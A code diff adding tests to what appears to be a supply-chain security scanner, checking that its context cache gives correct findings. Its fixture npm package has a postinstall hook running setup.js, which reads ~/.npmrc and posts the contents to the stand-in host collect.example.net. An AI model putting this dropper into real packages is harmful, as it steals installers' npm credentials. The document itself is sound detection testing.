@@ -658,3 +658,113 @@ class TestTheWatchNeverBreaksWhatItWatches:
         with ScanCache.watch(str(tmp_path), "own.md") as watch:
             Watch._audit("open", ("relative.md", "r", 0))
         assert watch.reached == "open"
+
+
+class ContextCacheKit:
+    """A small npm package whose context matters: an install hook that runs a dropper, and a
+    lockfile with dependencies. What it finds depends on the context (which file the hook runs)."""
+
+    @staticmethod
+    def package(root: Path) -> Path:
+        root.mkdir(parents=True, exist_ok=True)
+        (root / "package.json").write_text(
+            json.dumps(
+                {
+                    "name": "demo",
+                    "version": "1.0.0",
+                    "scripts": {"postinstall": "node setup.js"},
+                    "dependencies": {"left-pad": "1.3.0"},
+                }
+            ),
+            encoding="utf-8",
+        )
+        (root / "package-lock.json").write_text(
+            json.dumps(
+                {
+                    "name": "demo",
+                    "version": "1.0.0",
+                    "lockfileVersion": 3,
+                    "packages": {
+                        "": {
+                            "name": "demo",
+                            "version": "1.0.0",
+                            "dependencies": {"left-pad": "1.3.0"},
+                        },
+                        "node_modules/left-pad": {"version": "1.3.0"},
+                    },
+                }
+            ),
+            encoding="utf-8",
+        )
+        (root / "setup.js").write_text(
+            "const { execSync } = require('child_process');\n"
+            "const https = require('https');\n"
+            "const out = execSync('cat ~/.npmrc').toString();\n"
+            "https.request({ host: 'collect.example.net', method: 'POST' }).end(out);\n",
+            encoding="utf-8",
+        )
+        return root
+
+    @staticmethod
+    def scan(root: Path, cache: Path) -> tuple[list[tuple[str, str, int | None]], list[str], bool]:
+        result = Scanner(
+            Config.default().with_overrides(cache_dir=str(cache), use_cache=True)
+        ).scan(root)
+        findings = sorted((f.rule_id, f.location.path, f.location.line) for f in result.findings)
+        dependencies = sorted(f"{d.name}@{d.version}" for d in result.dependencies)
+        return findings, dependencies, result.complete
+
+
+class TestTheContextIsCached:
+    """The context worker's document is kept between scans of the same tree (4 Nov: a warm
+    20,000-file scan spent 10 s re-reading every file to rebuild it). A warm scan must find exactly
+    what a cold one finds; a changed file must be read afresh; a forged entry must not be used."""
+
+    def test_a_warm_scan_finds_what_a_cold_one_finds(self, tmp_path, monkeypatch) -> None:
+        root = ContextCacheKit.package(tmp_path / "pkg")
+        cold = ContextCacheKit.scan(root, tmp_path / "cache")
+        assert cold[0] and cold[1], (
+            "the package must draw findings and dependencies for this to test anything"
+        )
+        served: list[bool] = []
+        from cordon_scanner.engine.isolation.context_cache import ContextCache
+
+        real = ContextCache.get
+
+        def get_context(cache, digest: str, limit: int) -> str | None:
+            document = real(cache, digest, limit)
+            served.append(document is not None)
+            return document
+
+        monkeypatch.setattr(ContextCache, "get", staticmethod(get_context))
+        warm = ContextCacheKit.scan(root, tmp_path / "cache")
+        assert served and all(served), "the warm scan must have used the cached context"
+        assert warm == cold
+
+    def test_a_changed_hook_is_read_afresh(self, tmp_path) -> None:
+        root = ContextCacheKit.package(tmp_path / "pkg")
+        ContextCacheKit.scan(root, tmp_path / "cache")
+        manifest = json.loads((root / "package.json").read_text(encoding="utf-8"))
+        manifest["scripts"] = {}  # the dropper no longer runs at install
+        (root / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
+        warm = ContextCacheKit.scan(root, tmp_path / "cache")
+        fresh = ContextCacheKit.scan(root, tmp_path / "other-cache")
+        assert warm == fresh
+
+    def test_a_forged_context_entry_is_not_used(self, tmp_path) -> None:
+        root = ContextCacheKit.package(tmp_path / "pkg")
+        cold = ContextCacheKit.scan(root, tmp_path / "cache")
+        entries = [
+            p
+            for p in (tmp_path / "cache").rglob("*.json")
+            if '"<scan context>"' not in p.read_text(encoding="utf-8")
+        ]
+        forged = 0
+        for entry in entries:
+            payload = json.loads(entry.read_text(encoding="utf-8"))
+            if payload.get("findings") == [] and len(payload.get("facts", "")) > 100:
+                payload["facts"] = payload["facts"].replace("setup.js", "other.js")
+                entry.write_text(json.dumps(payload), encoding="utf-8")
+                forged += 1
+        assert forged, "a context entry must have been written for this to test anything"
+        assert ContextCacheKit.scan(root, tmp_path / "cache") == cold
